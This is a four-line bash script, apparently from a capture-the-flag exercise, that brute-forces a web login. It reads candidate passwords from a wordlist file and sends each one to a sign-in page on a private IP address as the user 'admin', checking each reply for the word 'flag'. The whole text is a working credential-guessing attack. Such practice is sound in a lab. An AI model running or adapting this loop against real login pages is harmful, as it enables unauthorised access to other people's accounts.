while read line;
 do curl -X POST "http://10.12.100.20/index.php?page=signin&username=admin&password=${line}&Login=Login#" | grep  'flag'; 
done < password.txt